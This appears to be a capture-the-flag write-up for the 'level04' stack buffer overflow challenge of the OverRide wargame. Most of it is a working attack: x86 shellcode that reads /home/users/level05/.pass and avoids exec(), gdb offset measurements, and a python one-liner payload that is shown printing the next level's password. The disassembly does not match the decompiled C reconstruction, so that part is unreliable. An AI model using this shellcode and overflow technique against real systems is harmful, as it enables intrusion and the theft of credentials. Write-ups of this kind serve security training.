# level04 - Stack Buffer Overflow

On `level04`'s HOME, we find a binary named : `level04`

```shell
...
0x08048444  main
...
```


```shell
gefâž¤  disass main
Dump of assembler code for function main:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	push   edi
   0x08048448 <+4>:	push   ebx
   0x08048449 <+5>:	and    esp,0xfffffff0
   0x0804844c <+8>:	sub    esp,0x90
   0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0
   0x0804845d <+25>:	mov    eax,ds:0x80497f0
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
   0x0804846e <+42>:	lea    eax,[esp+0x28]
   0x08048472 <+46>:	mov    DWORD PTR [esp],eax
   0x08048475 <+49>:	call   0x8048350 <fgets@plt>
   0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
   0x08048487 <+67>:	lea    eax,[esp+0x28]
   0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
   0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
   0x08048495 <+81>:	cmp    al,0x40
   0x08048497 <+83>:	jle    0x80484cb <main+135>
   0x08048499 <+85>:	lea    eax,[esp+0x28]
   0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
   0x080484a7 <+99>:	cmp    al,0x5a
   0x080484a9 <+101>:	jg     0x80484cb <main+135>
   0x080484ab <+103>:	lea    eax,[esp+0x28]
   0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
   0x080484b9 <+117>:	mov    edx,eax
   0x080484bb <+119>:	xor    edx,0x20
   0x080484be <+122>:	lea    eax,[esp+0x28]
   0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484c9 <+133>:	mov    BYTE PTR [eax],dl
   0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1
   0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c]
   0x080484da <+150>:	lea    eax,[esp+0x28]
   0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080484e6 <+162>:	mov    edx,eax
   0x080484e8 <+164>:	mov    eax,0x0
   0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
   0x080484f1 <+173>:	mov    edi,edx
   0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
   0x080484f5 <+177>:	mov    eax,ecx
   0x080484f7 <+179>:	not    eax
   0x080484f9 <+181>:	sub    eax,0x1
   0x080484fc <+184>:	cmp    ebx,eax
   0x080484fe <+186>:	jb     0x8048487 <main+67>
   0x08048500 <+188>:	lea    eax,[esp+0x28]
   0x08048504 <+192>:	mov    DWORD PTR [esp],eax
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
End of assembler dump.
```

<br>

After decompiling it using gdb, we build this code in C language:

```c
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <sys/types.h>
# include <sys/wait.h>
# include <unistd.h>
# include <sys/prctl.h>
# include <sys/ptrace.h>


int main(void) {

	int		*wstatus = NULL; // esp+0x1c
	char	str[32]; // esp+0x20
	int		tmp;	// esp+0xa8
	pid_t	pid; // esp+0xac

	for ( int i = 0; i < 32; i++ )
		str[i] = '\0';

	pid = fork();

	if ( pid ) {
		prctl( 1, 1 );
		ptrace( PTRACE_TRACEME, 0, NULL, NULL );
		puts( "Give me some shellcode, k" );
		gets( str );
	} else {

		while (1) {
			wait( wstatus );
			if ( *wstatus & 127 == 0 ) {
				if ( (*wstatus & 127) >> 1 == 0 ) {
					if ( ptrace(PTRACE_PEEKDATA, pid, 0x2c, NULL) == 0xb ) {
						puts("no exec() for you");
						kill(pid, 9);
						break;
					}
				}
			} else {
				puts( "child is exiting..." );
				break;
			}
		}

	}

	return 0;

}
```

From the assembly code and its transciption into C, we understand that we have
a buffer overflow vulnerability in the child process code (`gets( str );`),
so we can easily inject our shellcode into the buffer on the stack.
But there's one thing: we can't use functions from the `exec()` family to do this...
no problem, we'll write a shellcode that will allow us to read directly from the file
and write the result to stdout. Let's build it.

<br>

This is our crafted shellcode from this snippet:

```c
char buffer[42];

in fd = open("////home/users/level05/.pass", O_RDONLY);
read(fd, buffer, 41);
write(1, buffer, 41);
```

```assembly
global _start

section .text
_start:
    ; push '////home/users/level05/.pass\x00'
    xor ebx, ebx        ; ebx = 0
    push ebx            ; push NULL string terminator
    mov ebx, 'pass'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, '05/.'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, 'evel'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, 'rs/l'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, '/use'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, 'home'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, '////'     ; rest of file name
    push ebx            ; push to stack

    ; sys_open(const char * filename, int flags, int mode)
    xor eax, eax        ; eax = 0
    xor edx, edx        ; edx = 0
    mov al, 5           ; open syscall number
    mov ebx, esp        ; move pointer to filename
    xor ecx, ecx        ; set O_RDONLY flag = 0
    mov dx, 0644        ; set mode 0644
    int 0x80            ; call kernel

    ; sys_read(unsigned int fd, char * buf, size_t count)
    xor ebx, ebx        ; ebx = 0
    xor edx, edx        ; edx = 0
    mov bl, al          ; set fd from sys_open syscall return value (eax)
    mov ecx, esp        ; move pointer to stack to read on
    mov al, 3           ; sys_read syscall number
    mov dl, 41          ; size to read
    int 0x80            ; call kernel

    ; sys_write(unsigned int fd, const char * buf, size_t count)
    ; ecx already points on the stack (esp) to the string to read
    mov al, 4           ; sys_write syscall
    mov bl, 1           ; set fd to stdout
    mov dl, 41          ; size to read
    int 0x80            ; call kernel
```

After compile it, let's extract the shellcode (on our machine):

```shell
(cd /tmp && nasm -f elf exploit04.s && ld -m elf_i386 -o exploit04 exploit04.o)
count=0; for i in $(objdump -d /tmp/exploit04 |grep "^ " |cut -f2); do echo -n "\x$i"; count=$((count + 1)); done; echo; echo "$count bytes"
```

We get now our shellcode in well form with his length:

```shell
[SNIP]
\x31\xdb\x53\xbb\x70\x61\x73\x73\x53\xbb\x30\x35\x2f\x2e\x53\xbb\x65\x76\x65\x6c\x53\xbb\x72\x73\x2f\x6c\x53\xbb\x2f\x75\x73\x65\x53\xbb\x68\x6f\x6d\x65\x53\xbb\x2f\x2f\x2f\x2f\x53\x31\xc0\x31\xd2\xb0\x05\x89\xe3\x31\xc9\x66\xba\x84\x02\xcd\x80\x31\xdb\x31\xd2\x88\xc3\x89\xe1\xb0\x03\xb2\x29\xcd\x80\xb0\x04\xb3\x01\xb2\x29\xcd\x80
83 bytes
```

We have now our shellcode without syscall `exec()`.

<br>

Let's check how much space we have on the stack to inject our shellcode and rewrite eip.

> To get the correct eip register address and redirect address, you need to
> perform the test below to know the memory mapping during your execution of
> the `level04` program.

```shell
gdb) set follow-fork-mode child
(gdb) b *0x08048763
Breakpoint 1 at 0x8048763
(gdb) r < <(python -c 'print "A" * 200')
Starting program: /home/users/level04/level04 < <(python -c 'print "A" * 200')
[New process 1789]
child is exiting...
Give me some shellcode, k
[Switching to process 1789]

Breakpoint 1, 0x08048763 in main ()
(gdb) x/wx $esp+0x20
0xffffd670:	0x41414141
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x8048763 in main; saved eip 0x41414141
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd700, ebp at 0xffffd708, edi at 0xffffd704, eip at 0xffffd70c
```

So, there are **156 bytes** (*0xffffd70c - 0xffffd670 = 9c*). 
More than enough to inject our shellcode. We can also deduce the redirection
address, which will simply be the address of the buffer where our string is
stored (taking into account the different mapping between execution with and
without gdb which is approximately *+0x20 bit*): **0xffffd690**

<br>

To summary, we have:
- A nop instruction offset of **41 bytes** 
- Our shellcode with a length of **83 bytes**
- A nop instruction offset of **32 bytes**
- The new address of `eip` : **0xffffd690**

> Note: There's an overlap between the future `esp` when we execute our shellcode,
> as our buffer is on the stack, the values pushed by our shellcode will overlap
> the buffer where our shellcode is located and may corrupt the shellcode. We
> have therefore added nop instructions (32 bits) between our shellcode and `eip`.   

<br>

We can now exploit this BOF :

```shell
python -c 'print "\x90" * 41 + "\x31\xdb\x53\xbb\x70\x61\x73\x73\x53\xbb\x30\x35\x2f\x2e\x53\xbb\x65\x76\x65\x6c\x53\xbb\x72\x73\x2f\x6c\x53\xbb\x2f\x75\x73\x65\x53\xbb\x68\x6f\x6d\x65\x53\xbb\x2f\x2f\x2f\x2f\x53\x31\xc0\x31\xd2\xb0\x05\x89\xe3\x31\xc9\x66\xba\x84\x02\xcd\x80\x31\xdb\x31\xd2\x88\xc3\x89\xe1\xb0\x03\xb2\x29\xcd\x80\xb0\x04\xb3\x01\xb2\x29\xcd\x80" + "\x90" * 32 + "\xff\xff\xd6\x90"[::-1]' | ./level04
```


```shell
level04@OverRide:~$ python -c 'print "\x90" * 41 + "\x31\xdb\x53\xbb\x70\x61\x73\x73\x53\xbb\x30\x35\x2f\x2e\x53\xbb\x65\x76\x65\x6c\x53\xbb\x72\x73\x2f\x6c\x53\xbb\x2f\x75\x73\x65\x53\xbb\x68\x6f\x6d\x65\x53\xbb\x2f\x2f\x2f\x2f\x53\x31\xc0\x31\xd2\xb0\x05\x89\xe3\x31\xc9\x66\xba\x84\x02\xcd\x80\x31\xdb\x31\xd2\x88\xc3\x89\xe1\xb0\x03\xb2\x29\xcd\x80\xb0\x04\xb3\x01\xb2\x29\xcd\x80" + "\x90" * 32 + "\xff\xff\xd6\x90"[::-1]' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
